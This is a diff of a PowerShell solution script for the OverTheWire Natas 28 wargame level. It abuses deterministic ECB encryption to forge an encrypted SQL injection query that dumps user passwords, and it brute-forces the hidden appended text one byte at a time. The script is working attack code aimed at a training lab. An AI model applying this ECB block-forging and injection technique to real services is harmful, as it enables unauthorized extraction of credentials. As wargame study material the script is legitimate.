@@ -1,16 +1,13 @@
 using namespace System.Collection.Generic
 using namespace Microsoft.PowerShell.Utility
 using namespace uri
+using namespace System.Convert
 
 param (
-    [int]$fillFirstLine,
-    [int]$appendFullLines,
-    [int]$additionalAs
+    [string]$StrToTest
 )
 . "../natas_filter.ps1"
 . "../getCookieValueFromKey.ps1"
-
-
 
 $server = "natas28.natas.labs.overthewire.org/"
 #$server = "localhost:8000"
@@ -29,51 +26,45 @@ $headers = @{
     "Content-Type"  = "application/x-www-form-urlencoded"
 }
 
-write-host `n
-$unknownline = '?' * 16
-write-host $unknownline
-write-host $unknownline
+Function Convert-HexToByte {
+    # Copyright: (c) 2018, Jordan Borean (@jborean93) <jborean93@gmail.com>
+    # MIT License (see LICENSE or https://opensource.org/licenses/MIT)
 
-if ($fillFirstLine -gt 0) {
-    $a = 'a' * $fillFirstLine
-    write-host "??????$a" 
+    <#
+    .SYNOPSIS
+    Converts a string of hex characters to a byte array.
+    
+    .DESCRIPTION
+    Takes in a string of hex characters and returns the byte array that the
+    hex represents.
+    
+    .PARAMETER Value
+    [String] The hex string to convert.
+
+    .OUTPUTS
+    [byte[]] The byte array based on the converted hex string.
+    
+    .EXAMPLE
+    Convert-HexToBytes -Value "48656c6c6f20576f726c64"
+    
+    .NOTES
+    The hex string should have no spaces that separate each hex char.
+    #>
+    [CmdletBinding()]
+    [OutputType([byte[]])]
+    param(
+        [Parameter(Mandatory = $true)] [String]$Value
+    )
+    $bytes = New-Object -TypeName byte[] -ArgumentList ($Value.Length / 2)
+    for ($i = 0; $i -lt $Value.Length; $i += 2) {
+        $bytes[$i / 2] = [Convert]::ToByte($Value.Substring($i, 2), 16)
+    }
+
+    return [byte[]]$bytes
 }
-$a += ('a' * 16) * $appendFullLines
-for ($i = 1; $i -le $appendFullLines; $i++) {
-    Write-Host "aaaaaaaaaaaaaaaa - 16x:a"
-}
 
-
-
-
-if ($additionalAs -gt 0) {
-    $bla = 'a' * $additionalAs
-    $a += $bla 
-    $blabla = $bla + $unknownline.Substring($additionalAs)
-    write-host $blabla
-}
-else {
-    write-host $unknownline;
-}
-
-write-host $unknownline
-
-write-host `n
-
-<#
-1B E8 25 11 A7 BA 5B FD 57 8C 0E EF 46 6D B5 9C                            = 36 pre-string
-DC 84 72 8F DC F8 9D 93 75 1D 10 A7 C7 5C 8C F2
-
-C0 87 2D EE 8B C9 0B 11 56 91 3B 08 A2 23 A3 9E #<- 4*pre-string chars, 12*'a'
-
-B3 90 38 C2 8D F7 9B 65 D2 61 51 DF 58 F7 EA A3 #<- 16*'a'
-B3 90 38 C2 8D F7 9B 65 D2 61 51 DF 58 F7 EA A3 #<- 16*'a'
-
-CE 82 A9 55 3B 65 B8 12 80 FB 6D 3B F2 90 0F 47 #2*'a' && 14*after-string char       = 30 after-string
-75 FD 50 44 FD 06 3D 26 F6 BB 7F 73 4B 41 C8 99 #16*after-string char
-#>
-
-function GetLineAccordingToInputLength {
+#Only being able to return 1 line of the hex-output is inefficient but it works
+function GetLine {
     param (
         [string]$pData,
         [int]$returnLine
@@ -81,30 +72,17 @@ function GetLineAccordingToInputLength {
 
     try {
         $as = "query=$pData"
-        <#
-        $as += 'a' * $aCharacterAmount
-        if ($PSBoundParameters.ContainsKey('addChars')) {
-            foreach ($char in $addChars) {
-                $as += [char]$addChars
-            }
-        } #>
         Invoke-WebRequest -Headers $headers -URI $url -Method Post -Body $as -MaximumRedirection 0 -ErrorVariable errorr -ErrorAction SilentlyContinue
     }
     catch {
         $str = $errorr[0].InnerException.Response.Headers.Location.OriginalString
-        $base64encoded = $str.Substring(18)
+        $base64encoded = $str.Substring(18) #first 18 chars are: search.php/?query=
         $base64 = [uri]::UnescapeDataString($base64encoded)
     
         $bytearray = [System.Convert]::FromBase64String($base64)
         $hex = $bytearray | Format-Hex
         $i = 1;
         foreach ($line in ($hex.HexBytes -split "`n")) {
-            <#if ($line -like "B3 90 38 C2 8D F7 9B 65 D2 61 51 DF 58 F7 EA A3") {
-                write-host $i ":" $line " = aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa"
-            }
-            else {
-                write-host ($i.ToString() + ":" + $line) 
-            }#>
             if ($i -eq $returnLine) {
                 $result = $line
                 break
@@ -114,94 +92,199 @@ function GetLineAccordingToInputLength {
     }
     return $result
 }
-$ppurl = 'a' * (10 + 16)
-$16AbyteStr = GetLineAccordingToInputLength -pData $ppurl -returnLine 4
-Write-Host "Full A Bytes: " `n $16AbyteStr `n 
+
+<#
+--------------------------------------------
+input (amount of 'a' characters): 10+16+16
+    --------------------------------------------
+    1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c //never changes;no influence
+    dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 //never changes;no influence
+    5a a9 eb 8b 6c 70 f6 24 31 cf c8 a2 e4 b5 71 05 /*This line contains: ??????aaaaaaaaaa*/ /*First 6 Chars are unknown and static, 10 are my own input */
+
+    b3 90 38 c2 8d f7 9b 65 d2 61 51 df 58 f7 ea a3 /* 16 characters of 'a'*/ 
+    b3 90 38 c2 8d f7 9b 65 d2 61 51 df 58 f7 ea a3 /* 16 characters of 'a'*/ 
+
+    73 8a 5f fb 4a 45 00 24 67 75 17 5a e5 96 bb d6 /* These content of these two lines are appended after my input */
+    f3 4d f3 39 c6 9e dc e1 1f 66 50 bb ce d6 27 02 /* Might not be 16 bytes of data, might contain padding */
+    --------------------------------------------
+--------------------------------------------
+
+Implies the following structure:
+    $pre-string $OUR-USER-INPUT $after-string
+Which reminds of:
+    -------------pre-string------------                     ---after-string---
+    "SELECT * FROM TABLE WHERE FIELD =" + $OUR-USER-INPUT + " GROUP BY FIELD"
+
+By being able to receive deterministic, encrypted blocks, we can:
+    Instead of receiving this:
+        b3 90 38 c2 8d f7 9b 65 d2 61 51 df 58 f7 ea a3 /* 16 characters of 'a'*/
+    We want to receive this:
+        SOME-HEX-BLOCK /* SELECT Password FROM USERS */ 
+#>
+
+<#
+#How to decrypt certain lines by guessing/assuming their content 
+#There is a lot missing in this code, but it has everything to understand
+
+$selectArray = @("SELECT", "Select", "select");
+$fromArray = @("FROM", "From", "from");
+$joArray = @("JO", "Jo", "jo");
+
+$kes = @("kes");
+$whereArray = @("WHERE", "Where", "where");
+$textArray = @("TEXT", "Text", "text");
+$textArray = @("JOKE", "Joke", "joke");
+$lArray = @("l", "L");
+
+foreach ($select in $selectArray) {
+    foreach ($from in $fromArray) {
+        foreach ($jo in $joArray) {
+            $cmd = "$select * $from $jo"
+            $cmd
+            
+            $inputData = ('a' * 10)
+            $inputData += $cmd; 
+
+            $firstLineHEXStr = GetLine -pData $inputData -returnLine 1
+            $response = GetLine -pData $inputData -returnLine 4
+
+            if ($firstLineHEXStr -eq $response) {
+                write-host "CORRECT:"`n$firstLineHEXStr`n$response`n
+            } else {
+                write-host "FALSE:"`n$firstLineHEXStr`n$response`n
+            } 
+
+        }
+    }
+}
+#>
+
+# The server enumerates through the mysql_rows result, and accesses the "joke" Field:
+    # SELECT Password AS Joke FROM Users
+    # SELECT * from jokes -- aaaaaa123
+
+$inputData = ('a' * 10) + "SELECT Password ";
+$HEXStr = GetLine -pData $inputData -returnLine 4
+
+write-host `n($inputData.Substring(10))`n$HEXStr
+$firstLine = $HEXStr.replace(" ", "");
+
+#case-sensitive; refer to "How to decrypt certain lines" to find out which keywords are sensitive.
+$inputData = ('a' * 10) + "AS joke from use"; 
+$HEXStr = GetLine -pData $inputData -returnLine 4
+
+write-host `n($inputData.Substring(10))`n$HEXStr
+$secondLine = $HEXStr.replace(" ", "");
+
+
+$inputData = ('a' * 10)
+$inputData += "rs LIMIT 10 -- " #15 chars
+$inputData += [char]0x01 #valid PKCS#7 padding 
+$HEXStr = GetLine -pData $inputData -returnLine 4
+
+write-host `n($inputData.Substring(10))`n$HEXStr
+$thirdLine = $HEXStr.replace(" ", "");
+
+$bytearray = Convert-HexToByte -Value ($firstLine + $secondLine + $thirdline)
+$base64String = [Convert]::ToBase64String($byteArray)
+$escaped = [uri]::EscapeDataString($base64String)   
+
+#This is the Payload: Base64-encoded string you can pass as ?query= value in /search.php 
+write-host `n $escaped 
+
+#Just a visual to check if everything is correct
+$backescaped = [uri]::UnescapeDataString($escaped)
+[Convert]::FromBase64String($backescaped) | Format-Hex 
+
+
+
+exit
+#---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#This section is an example (working, but not-so-working) 
+#to decrypt all the characters in the cypher-block AFTER our input
+#Imagine this:
+
+<#
+
+    ???????????????? 16x unkown
+    ???????????????? 16x unkown
+    ??????aaaaaaaaaa 6x unknown
+
+4:  aaaaaaaaaaaaaaaa 16x KNOWN
+
+    ???????????????? 16x unknown
+    ????------------ # "-" is padding
+
+
+By only passing 15x KNOWN characters in block 4:
+
+4:  aaaaaaaaaaaaaaa? 15x KNOWN 1x unknown. We save this result in $byteStrToCheck
+5:  ????????????????
+6:  ???------------- #one less; one of the unknown 20 characters moved up to line number 4
+
+        foreach($char in $asciiChars) {
+            #Pass: 15x KNOWN chars, append $char
+            #4:  aaaaaaaaaaaaaaa + $char
+            #If this result equals $byteStrToCheck you have decrypted the unknown byte at block-Index 16.            
+        }
+
+        
+By only passing 14x KNOWN characters in block 4:
+
+4:  aaaaaaaaaaaaaa?? 15x KNOWN (14 is our input; nr.15 is the one we just decrypted) 1x unknown. We save this result in $byteStrToCheck
+5:  ????????????????
+6:  ??-------------- #two less total;
+
+        foreach($char in $asciiChars) {
+            #Pass: 15x KNOWN chars, append $char
+            #4:  aaaaaaaaaaaaaa? + $char
+            #If this result equals $byteStrToCheck you have decrypted the unknown byte at block-Index 16.            
+        }
+
+
+In this challenge, this only works for one char of the next line. 
+The second char of the next line is a single-quote, which is escaped by the server, wreaks havoc, and just doesn't work. There's probably a way but idk.
+#>
 
 $checkCharArray = @()
 
 # Add ASCII characters (0-127)
-for ($i = 32; $i -le 127; $i++) {
-    $checkCharArray += [char]$i
+for ($i = 1; $i -le 127; $i++) {
+    if ($i -ne 8) {
+        $checkCharArray += [char]$i
+    }
 }
 
-
-$prestr = ""
+$knownCharacters = ""
 for ($minusCharAmount = 1; $minusCharAmount -le 16; $minusCharAmount++) {
 
     $charAmount = 16 - $minusCharAmount
-    $ppurl = 'a' * (10 + $charAmount)
-    $ppurl += $prestr
-    $ppurl
+    $inputData = 'a' * (10 + $charAmount)
     
-    $forAbyteStrToCheckFor = GetLineAccordingToInputLength -pData $ppurl -returnLine 4
+    $byteStrToCheck = GetLine -pData $inputData -returnLine 4
 
-    write-host "Searching/Checking for: "`n ("$charamount 'a':$prestr") `n "                 $forAbyteStrToCheckFor" `n 
+    write-host "Searching/Checking for: "`n ("(" + $charamount + "x'a')$knownCharacters" + " and 1x unknown") "                     $byteStrToCheck" `n 
     
     foreach ($char in $checkCharArray) {
         
-        $currentPreStr = $prestr + $char
-        $ppurl = 'a' * (10 + $charAmount)
-        $ppurl += $currentPreStr
+        $bruteforcePayload = $knownCharacters + $char
+        $inputData = 'a' * (10 + $charAmount)
+        $inputData += $bruteforcePayload
 
-        #Write-Host " - Checking with " `n $charamount "'a':" $currentPreStr
-        $SingleByteCheckResult = GetLineAccordingToInputLength -pData $ppurl -returnLine 4
-        if ($SingleByteCheckResult -eq $forAbyteStrToCheckFor) {
-            write-host `n " - - RESULT::::" $charamount  ":" + $char
-            Write-Host " - - $forAbyteStrToCheckFor " `n " - - equals = " `n " - - $SingleByteCHeckResult"
-            $prestr += $char
+        #Write-Host " - Checking with " `n $charamount "'a':" $bruteforcePayload
+        $bruteForceByteCheck = GetLine -pData $inputData -returnLine 4
+        if ($bruteForceByteCheck -eq $byteStrToCheck) {
+            write-host `n " - - RESULT::::" $charamount  ":'a'" + $char
+            Write-Host " - - $byteStrToCheck " `n " - - equals = " `n " - - $bruteForceByteCheck"
+            $knownCharacters += $char
             break
-        } else {
-            write-host ("    FALSE-Input: $charamount" + "x" + ":'a'$currentPreStr" + "     $SingleByteCheckResult")  
+        }
+        else {
+            write-host ("    FALSE-Input: ($charamount" + "x 'a')$bruteforcePayload" + "     $bruteForceByteCheck")  
         }
     }
-    write-host " `n - Nr:$minusCharAmount " $prestr `n
+    write-host " `n - Nr:$minusCharAmount " $knownCharacters `n
 }
 
-
-<#
-$URLencoded = 'G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qOzkDjCjfebZdJhUd9Y9+qjs5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qOzkDjCjfebZdJhUd9Y9+qjs5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qOzkDjCjfebZdJhUd9Y9+qjs5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qOzkDjCjfebZdJhUd9Y9+qjs5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qOzkDjCjfebZdJhUd9Y9+qjs5A4wo33m2XSYVHfWPfqo7TtoIfTwL6ivtwbYUC54uvKjPTmEJE6uuOaBnYZIEpa'
-$shawty = [uri]::($URLencoded)
-$shawty
-$bytearray = [System.Convert]::FromBase64String($shawty)
-
-
-$hexString = "1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 c0 87 2d ee 8b c9 0b 11 56 91 3b 08 a2 23 a3 9e b3 90 38 c2 8d f7 9b 65 d2 61 51 df 58 f7 ea a3 b3 90 38 c2 8d f7 9b 65 d2 61 51 df 58 f7 ea a3 1f 74 71 4d 76 fc c5 d4 64 c6 a2 21 e6 ed 98 e4 62 23 a1 4d 9c 42 91 b9 87 75 b0 3f bc 73 d4 ed d8 ae 51 d7 da 71 b2 b0 83 d9 19 a0 d7 b8 8b 98"
-$hexString = $hexString -replace " ", ""
-
-$bytes = for ($i = 0; $i -lt $hexString.Length; $i += 2) {
-    [Convert]::ToByte($hexString.Substring($i, 2), 16)
-}
-
-$filepath = 'C:\Users\Francisco\Desktop\OTW\natas\28natas\tmp\fileasdasd.bin'
-if (Test-Path $FilePath) {
-    remove-item -Path $FilePath
-    "removed"
-}
-
-    #Create a new file
-    New-Item -Path $FilePath
-    Write-host "New File '$FilePath' Created!" -f Green
-
-[System.IO.File]::WriteAllBytes($filepath, $bytes)
-#>
-
-
-<#
-exit
-$param = "?username=natas27$s&password=hi"
-$param
-(Invoke-WebRequest -Headers $headers -URI ($url + $param)  -SessionVariable sessVar).Content
-
-$param = "?username=natas27 &password=hi"
-(Invoke-WebRequest -Headers $headers -URI ($url + $param) -WebSession $sessVar).Content
-
-
-
-'A' base64
-
-
-
-
-#>
 write-host `n
